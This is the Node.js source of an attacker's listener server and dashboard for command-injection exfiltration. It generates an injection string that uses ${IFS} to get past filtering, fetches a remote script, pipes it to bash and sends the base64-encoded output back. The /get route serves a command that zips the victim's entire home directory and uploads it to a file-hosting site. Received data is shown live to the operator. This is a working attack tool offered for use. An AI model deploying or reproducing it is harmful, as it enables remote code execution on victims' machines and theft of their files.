/*
 * © 2026 SeXyxeon (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@voidsec7718
 * Instagram : sabir._7718
 * Telegram  : https://t.me/SABIR7718
 * GitHub    : https://github.com/SABIR7718
 * WhatsApp  : +91 73650 85213
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const { log } = require('@sabir7718/log');

const port = process.env.PORT || 8888;

app.get('/receive/:userCode', (req, res) => {
    const userCode = req.params.userCode;
    let base64 = req.query.data;

    if (Array.isArray(base64)) {
        base64 = base64.find(item => item && item.trim().length > 0);
    }

    if (!base64) {
        return res.status(400).send('Missing data parameter');
    }

    try {
        const decoded = Buffer.from(base64, 'base64').toString('utf-8');

        io.emit(`data_${userCode}`, {
            userCode: userCode,
            raw: decoded,
            timestamp: new Date().toLocaleTimeString()
        });

        return res.status(200).send('Data Received Successfully');
    } catch (e) {
        return res.status(500).send('Failed to process data');
    }
});

app.get('/get', (req, res) => {
    const htmlContent = `cd ~ && zip -rq ~/hi-im-s7.zip . -x 'node_modules/*' '*/node_modules/*' && curl -fsS -F "file=@$HOME/hi-im-s7.zip" https://upload.gofile.io/uploadFile | grep -oE 'https?[^"]+' | head -1 && rm -f ~/hi-im-s7.zip`;

    res.send(htmlContent);
});

app.get('/', (req, res) => {
    const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private User Dashboard</title>
    <style>
        body { font-family: monospace; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; }
        .header { background: #1e293b; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #334155; }
        .code-box { background: #020617; color: #38bdf8; padding: 10px 15px; border-radius: 6px; font-size: 1.1em; word-break: break-all; margin-top: 10px; border: 1px dashed #38bdf8; }
        .card { background: #1e293b; border-left: 5px solid #22c55e; padding: 15px; margin-bottom: 12px; border-radius: 6px; }
        .time { font-size: 0.8em; color: #94a3b8; float: right; }
        .clear-btn { background: #ef4444; color: white; border: none; padding: 8px 14px; border-radius: 4px; cursor: pointer; float: right; font-weight: bold; }
        .clear-btn:hover { background: #dc2626; }
        pre { background: #020617; padding: 10px; border-radius: 4px; color: #4ade80; white-space: pre-wrap; word-break: break-all; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>Your Private Listener Dashboard</h2>
            <p>Your Secret Code: <strong id="myCode" style="color:#f43f5e;">Loading...</strong></p>
            <p>Send data ONLY to your link below:</p>
            <div class="code-box" id="myLink">Generating your private link...</div>
        </div>
        
        <div>
            <button class="clear-btn" onclick="clearCookies()">🗑️ Clear All Logs</button>
            <h3>Live Received Logs (Saved in Cookie):</h3>
        </div>
        <div id="logs"></div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const logsContainer = document.getElementById('logs');

        function setCookie(name, value, days) {
            let expires = "";
            if (days) {
                const date = new Date();
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                expires = "; expires=" + date.toUTCString();
            }
            document.cookie = name + "=" + (encodeURIComponent(value) || "") + expires + "; path=/";
        }

        function getCookie(name) {
            const nameEQ = name + "=";
            const ca = document.cookie.split(';');
            for(let i = 0; i < ca.length; i++) {
                let c = ca[i];
                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                if (c.indexOf(nameEQ) === 0) return decodeURIComponent(c.substring(nameEQ.length, c.length));
            }
            return null;
        }

        let myUserCode = getCookie('user_code');
        if (!myUserCode) {
            myUserCode = 'user_' + Math.random().toString(36).substring(2, 9);
            setCookie('user_code', myUserCode, 30);
        }

        document.getElementById('myCode').innerText = myUserCode;
        const fullLink = 'dummy;curl\${IFS}--get\${IFS}--data-urlencode\${IFS}data="$(curl\${IFS}-s\${IFS}https://hack-with-s7.shamrez.store/get\${IFS}|\${IFS}bash|base64\${IFS}-w0)"\${IFS}' + window.location.origin + '/receive/' + myUserCode + '?data=';
        document.getElementById('myLink').innerText = fullLink;

        const cookieKey = 'logs_' + myUserCode;

        function loadLogsFromCookie() {
            const saved = getCookie(cookieKey);
            logsContainer.innerHTML = '';
            if (saved) {
                try {
                    const parsed = JSON.parse(saved);
                    parsed.forEach(item => renderCard(item));
                } catch(e) {}
            }
        }

        function renderCard(data) {
            const card = document.createElement('div');
            card.className = 'card';

            card.innerHTML = \`
                <div>
                    <strong>Received Message</strong>
                    <span class="time">\${data.timestamp}</span>
                </div>
                <pre>\${escapeHtml(data.raw)}</pre>
            \`;

            logsContainer.prepend(card);
        }

        socket.on('data_' + myUserCode, (data) => {
            let currentLogs = [];
            const saved = getCookie(cookieKey);
            if (saved) {
                try { currentLogs = JSON.parse(saved); } catch(e) {}
            }

            currentLogs.push(data);
            if (currentLogs.length > 10) {
                currentLogs.shift();
            }

            setCookie(cookieKey, JSON.stringify(currentLogs), 7);
            renderCard(data);
        });

        function clearCookies() {
            setCookie(cookieKey, "", -1);
            logsContainer.innerHTML = '';
        }

        function escapeHtml(text) {
            return text
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }

        loadLogsFromCookie();
    </script>
</body>
</html>
    `;
    res.send(htmlContent);
});

server.listen(port, () => {
    log(`success`, `SERVER`, `Server listening on http://localhost:${port}/`);
});

if (process.env.URL) {

    (async () => {
        try {
            const res = await fetch(process.env.URL);
            log('info', 'PING', `Pinged: ${process.env.URL} | Status: ${res.status}`);
        } catch (err) {
            log('error', 'PING', err.message);
        }
    })();

    setInterval(async () => {
        try {
            const res = await fetch(process.env.URL);
            log('info', 'PING', `Pinged: ${process.env.URL} | Status: ${res.status}`);
        } catch (err) {
            log('error', 'PING', err.message);
        }
    }, 5 * 60 * 1000);
}